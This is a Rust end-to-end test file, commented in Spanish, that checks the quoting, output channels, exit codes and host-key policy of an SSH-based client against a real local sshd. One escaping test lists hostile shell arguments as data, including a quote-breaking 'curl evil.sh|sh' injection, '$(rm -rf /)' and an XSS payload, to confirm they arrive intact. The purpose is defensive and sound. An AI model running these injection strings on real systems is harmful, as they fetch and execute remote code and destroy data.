//! De punta a punta, atravesando un `sshd` de verdad.
//!
//! **Por qué esto no es opcional.** Ejecutar el binario falso en local cubre el
//! parser, los `null` y los seis finales en milisegundos, y no cubre nada de lo
//! que de verdad puede romperse en el camino. La lección viene de Orbit y es
//! literal: *lo que sólo existe dentro del espacio de nombres de systemd no lo
//! ve `make test`*. Aquí la frase equivalente es: **lo que sólo existe dentro de
//! un shell remoto no lo ve un doble local.**
//!
//! El escapado se prueba contra un shell de verdad o no se ha probado. Y hay una
//! propiedad incómoda debajo: `sshd` **siempre** entrega la petición al shell de
//! login del usuario remoto, y OpenSSH **concatena con espacios** los argumentos
//! que le sobran. O sea que «pasarle un argv separado a `ssh`» es una creencia
//! falsa, y muy extendida.
//!
//! Estas pruebas van marcadas `#[ignore]` para que `cargo test` siga siendo de
//! un segundo. Se ejecutan con:
//!
//! ```text
//! tests/e2e/montar-sshd.sh /tmp/e2e-orbit
//! ORBIT_E2E=/tmp/e2e-orbit cargo test -p orbit-client --test e2e_sshd -- --ignored --nocapture
//! tests/e2e/parar-sshd.sh /tmp/e2e-orbit
//! ```

use std::fs;
use std::path::{Path, PathBuf};
use std::time::Instant;

use orbit_client::comando::Comando;
use orbit_client::contrato::*;
use orbit_client::transporte::{ejecutar, ErrorTransporte, Respuesta, Servidor};

fn banco() -> PathBuf {
    let d = std::env::var("ORBIT_E2E")
        .expect("sin ORBIT_E2E: monta el banco con tests/e2e/montar-sshd.sh");
    PathBuf::from(d)
}

/// Un `~/.ssh/config` de verdad, y no opciones sueltas. Es lo que decimos que
/// delegamos, así que probarlo así ejercita justo la decisión: si un día
/// alguien sustituyera el binario `ssh` por una librería, esta prueba se caería
/// —que es lo que tiene que pasar—.
fn escribir_config(dir: &Path, puerto: u16) -> String {
    let usuario = std::env::var("USER").unwrap_or_else(|_| "ubuntu".into());
    let ruta = dir.join("ssh_config");
    fs::write(
        &ruta,
        format!(
            "Host banco\n  \
               HostName 127.0.0.1\n  \
               Port {puerto}\n  \
               User {usuario}\n  \
               IdentityFile {}\n  \
               IdentitiesOnly yes\n  \
               UserKnownHostsFile {}\n  \
               SendEnv ORBIT_FAKE_CASE ORBIT_FAKE_LOG\n",
            dir.join("cliente").display(),
            dir.join("known_hosts").display(),
        ),
    )
    .unwrap();
    ruta.to_string_lossy().into_owned()
}

fn servidor(multiplexar: bool) -> Servidor {
    let d = banco();
    let mut s = Servidor::nuevo("banco", "banco");
    s.binario = d.join("fakeserver/orbit").to_string_lossy().into_owned();
    s.config_ssh = Some(escribir_config(&d, 2222));
    s.multiplexar = multiplexar;
    s
}

fn dir_control() -> Option<String> {
    let d = banco().join("control");
    fs::create_dir_all(&d).unwrap();
    // 0700: un socket de control es una sesión guardada en un fichero.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&d, fs::Permissions::from_mode(0o700)).unwrap();
    }
    Some(d.to_string_lossy().into_owned())
}

fn pedir(c: &Comando, caso: &str) -> Result<Respuesta, ErrorTransporte> {
    ejecutar(&servidor(false), c, None, &[("ORBIT_FAKE_CASE", caso)])
}

// ── que el viaje entero funciona ───────────────────────────────────────────

#[test]
#[ignore = "necesita el sshd del banco"]
fn el_saludo_cruza_una_sesion_ssh_de_verdad() {
    let r = pedir(&Comando::Version, "sano").unwrap();
    let v: Version = r.leer().unwrap();
    assert_eq!(v.contract, 1);
    assert_eq!(v.compatibilidad(), Compatibilidad::Exacta);
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn el_ssh_config_es_quien_resuelve_el_destino() {
    // El destino es un alias —'banco'— y todo lo demás (host, puerto, usuario,
    // clave) sale del fichero. Es exactamente lo que se delega, y por eso se
    // prueba así.
    let s = servidor(false);
    assert_eq!(s.destino, "banco");
    let r = ejecutar(&s, &Comando::Lista, None, &[("ORBIT_FAKE_CASE", "sano")]).unwrap();
    let l: Lista = r.leer().unwrap();
    assert_eq!(l.apps.len(), 3);
}

// ── EL escapado, de punta a punta ──────────────────────────────────────────

/// Aquí no se comprueba lo que devuelve: **se comprueba lo que le llegó.**
///
/// El servidor falso apunta su `argv` con los argumentos separados por bytes
/// nulos, y eso es la aserción. Es la única forma de saber si un nombre con una
/// comilla dentro sobrevivió al viaje como **un** argumento o se partió en
/// varios por el camino.
fn argv_recibido(argumentos: &[&str]) -> Vec<String> {
    let d = banco();
    let log = d.join("argv.log");
    let _ = fs::remove_file(&log);
    let ruta_log = log.to_string_lossy().into_owned();

    // Se usa 'exec' porque es el único comando que acepta argumentos
    // arbitrarios, que es justo lo que hay que poder mandar sin que se rompa.
    let s = servidor(false);
    let mut argv: Vec<String> = vec![s.binario.clone(), "exec".into()];
    argv.extend(argumentos.iter().map(|x| x.to_string()));
    let linea = orbit_client::shquote::build(&argv).unwrap();

    let salida = std::process::Command::new("ssh")
        .args(s.opciones_ssh(None))
        .env("ORBIT_FAKE_LOG", &ruta_log)
        .arg(&s.destino)
        .arg(&linea)
        .output()
        .unwrap();
    assert!(
        salida.status.success() || !salida.stderr.is_empty(),
        "el viaje ni siquiera llegó"
    );

    // El fichero entero, y no su primera línea: un argumento puede llevar un
    // salto de línea dentro, y partir por líneas rompía el registro justo en
    // los casos que esta prueba existe para cubrir.
    let bruto = fs::read(&log).expect("el falso no apuntó nada: ¿cruzó el SendEnv?");
    let s = String::from_utf8_lossy(&bruto);
    let mut v: Vec<String> = s.split('\0').map(String::from).collect();
    v.pop(); // el nulo final deja un elemento vacío
    v.remove(0); // el subcomando 'exec'
    v
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn los_argumentos_hostiles_llegan_enteros_al_otro_lado() {
    // Cada uno de éstos parte un escapado hecho a mano, y los cinco son
    // entradas normales: un nombre de app, un dominio, un `--ref` pegado de un
    // PR, un comando de `exec`.
    let casos: Vec<Vec<&str>> = vec![
        vec!["hola mundo"],
        vec!["a'; curl evil.sh|sh; '"],
        vec!["$(rm -rf /)"],
        vec!["`id`"],
        vec!["${IFS}"],
        vec!["a\nb"],
        vec!["--json"],
        vec!["=Y"],
        vec!["~"],
        vec!["*"],
        vec!["</script><img src=x onerror=alert(1)>"],
        vec!["psql", "select 1 from tabla where x = 'y'"],
        vec!["uno", "", "tres"],
        vec!["ñandú 🚀"],
    ];
    for c in casos {
        let recibido = argv_recibido(&c);
        let esperado: Vec<String> = c.iter().map(|x| x.to_string()).collect();
        assert_eq!(
            recibido, esperado,
            "el argumento no sobrevivió al viaje: {c:?} llegó como {recibido:?}"
        );
    }
}

// ── stdout y stderr, separados de verdad ───────────────────────────────────

#[test]
#[ignore = "necesita el sshd del banco"]
fn los_dos_canales_no_se_mezclan_sobre_ssh() {
    // Con --json, Orbit manda por stderr TODO lo dirigido a una persona. Si los
    // canales se mezclaran, el objeto llegaría con el motd dentro.
    let r = pedir(&Comando::Lista, "ruido-stderr").unwrap();
    let l: Lista = r
        .leer()
        .expect("el ruido de stderr no puede ensuciar el objeto");
    assert_eq!(l.apps.len(), 3);
    assert!(r.stderr.contains("Ubuntu"));
    assert!(!r.stdout.contains("Ubuntu"));
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn un_stderr_grande_no_bloquea_la_lectura() {
    // La prueba del bloqueo mutuo: si los dos descriptores se leyeran en serie,
    // esto se colgaría en cuanto stderr llenara su tubería (64 KB en Linux).
    let r = pedir(&Comando::Lista, "ruido-stderr");
    assert!(r.is_ok(), "se ha bloqueado leyendo los dos canales");
}

// ── los códigos de salida, que son de dos sitios ───────────────────────────

#[test]
#[ignore = "necesita el sshd del banco"]
fn el_255_de_ssh_no_se_confunde_con_un_fallo_de_orbit() {
    // Confundirlos marca un servidor entero como caído porque el usuario pidió
    // una app que no existe. Aquí se provoca el de ssh apuntando a un puerto
    // donde no hay nadie.
    let mut s = servidor(false);
    s.config_ssh = None;
    s.destino = format!("{}@127.0.0.1", std::env::var("USER").unwrap_or_default());
    s.puerto = Some(59999);
    let e = ejecutar(&s, &Comando::Version, None, &[]).unwrap_err();
    assert!(
        matches!(e, ErrorTransporte::NoLlego { .. }),
        "esperaba un fallo del canal, no {e:?}"
    );
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn orbit_que_no_esta_se_distingue_del_servidor_que_no_llega() {
    let mut s = servidor(false);
    s.binario = "/usr/local/bin/orbit-que-no-existe".into();
    let e = ejecutar(&s, &Comando::Version, None, &[]).unwrap_err();
    assert!(
        matches!(e, ErrorTransporte::OrbitNoEsta { .. }),
        "esperaba «no hay orbit ahí», no {e:?}"
    );
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn un_despliegue_fallido_trae_su_objeto_aunque_el_rc_sea_1() {
    let c = Comando::Desplegar {
        app: "mi-web".into(),
        progreso: false,
    };
    let r = pedir(&c, "fallo-con-objeto").expect("el objeto cruza aunque el rc sea 1");
    let d: Despliegue = r.leer().unwrap();
    assert!(!d.ok);
    assert_eq!(d.failed_step.as_deref(), Some("build"));
}

// ── ControlMaster: la palanca de latencia, medida ──────────────────────────

#[test]
#[ignore = "necesita el sshd del banco"]
fn el_multiplexado_ahorra_el_saludo_y_se_mide() {
    let ctrl = dir_control();
    let sin = servidor(false);
    let con = servidor(true);

    let medir = |s: &Servidor, ctrl: Option<&str>| -> u128 {
        let mut t = Vec::new();
        for _ in 0..5 {
            let i = Instant::now();
            let _ = ejecutar(s, &Comando::Version, ctrl, &[("ORBIT_FAKE_CASE", "sano")]);
            t.push(i.elapsed().as_millis());
        }
        t.sort_unstable();
        t[t.len() / 2] // mediana, no media
    };

    // La primera con multiplexado paga el saludo y deja el master abierto.
    let _ = ejecutar(
        &con,
        &Comando::Version,
        ctrl.as_deref(),
        &[("ORBIT_FAKE_CASE", "sano")],
    );

    let a = medir(&sin, None);
    let b = medir(&con, ctrl.as_deref());
    println!("  saludo completo: {a} ms · multiplexado: {b} ms");

    // Cerrar el master, que es la otra mitad: dejarlo abierto es dejar una
    // sesión viva en la máquina de quien ejecuta las pruebas.
    let _ = std::process::Command::new("ssh")
        .args(con.opciones_ssh(ctrl.as_deref()))
        .args(["-O", "exit", &con.destino])
        .output();

    // Contra 127.0.0.1 el ahorro es pequeño —el saludo no cruza una red— así
    // que aquí no se afirma un factor: se afirma que multiplexar **no es más
    // lento**, que es lo único honesto que se puede medir en bucle local. La
    // cifra que importa (246 ms frente a 13 ms) se mide contra un VPS real.
    assert!(
        b <= a + 20,
        "multiplexar salió más lento: {b} ms frente a {a} ms"
    );
}

// ── known_hosts: la política de primer contacto ────────────────────────────

#[test]
#[ignore = "necesita el sshd del banco"]
fn una_clave_de_host_que_cambia_es_un_error_y_no_tiene_boton() {
    let d = banco();
    let kh = d.join("known_hosts_falseado");
    // Un host conocido, con la clave de OTRO. Es exactamente lo que se ve en un
    // ataque de suplantación.
    let otra = d.join("clave_intrusa");
    let _ = fs::remove_file(&otra);
    let _ = fs::remove_file(otra.with_extension("pub"));
    std::process::Command::new("ssh-keygen")
        .args(["-q", "-t", "ed25519", "-N", "", "-f"])
        .arg(&otra)
        .output()
        .unwrap();
    let pub_intrusa = fs::read_to_string(otra.with_extension("pub")).unwrap();
    fs::write(&kh, format!("[127.0.0.1]:2222 {pub_intrusa}")).unwrap();

    let usuario = std::env::var("USER").unwrap_or_else(|_| "ubuntu".into());
    let cfg = d.join("ssh_config_falseado");
    fs::write(
        &cfg,
        format!(
            "Host banco\n  HostName 127.0.0.1\n  Port 2222\n  User {usuario}\n  \
             IdentityFile {}\n  IdentitiesOnly yes\n  UserKnownHostsFile {}\n",
            d.join("cliente").display(),
            kh.display()
        ),
    )
    .unwrap();

    let mut s = servidor(false);
    s.config_ssh = Some(cfg.to_string_lossy().into_owned());
    let e = ejecutar(&s, &Comando::Version, None, &[]).unwrap_err();

    // Tiene que fallar, y con su **propio** error. No es un problema de red:
    // es exactamente lo que se ve en un ataque de suplantación, y llegarle a la
    // interfaz como «no he llegado al servidor» sería describirlo mal en el
    // único error del canal que el usuario tiene que leer entero.
    assert!(
        matches!(e, ErrorTransporte::ClaveDeHostCambiada { .. }),
        "una clave de host cambiada tiene su propio camino, no {e:?}"
    );
    let m = format!("{e}").to_lowercase();
    assert!(
        m.contains("clave") && m.contains("cambiado"),
        "el mensaje tiene que decir qué ha pasado: {m}"
    );
    // Y el detalle de ssh se conserva entero, para poder enseñarlo: ahí va la
    // huella y la línea del known_hosts que hay que quitar.
    if let ErrorTransporte::ClaveDeHostCambiada { detalle } = &e {
        assert!(detalle.contains("known_hosts") || detalle.contains("SHA256"));
    }
}

#[test]
#[ignore = "necesita el sshd del banco"]
fn nunca_se_desactiva_la_comprobacion_de_host() {
    let o = servidor(false).opciones_ssh(None).join(" ");
    assert!(!o.contains("StrictHostKeyChecking=no"));
    assert!(o.contains("StrictHostKeyChecking=accept-new"));
}
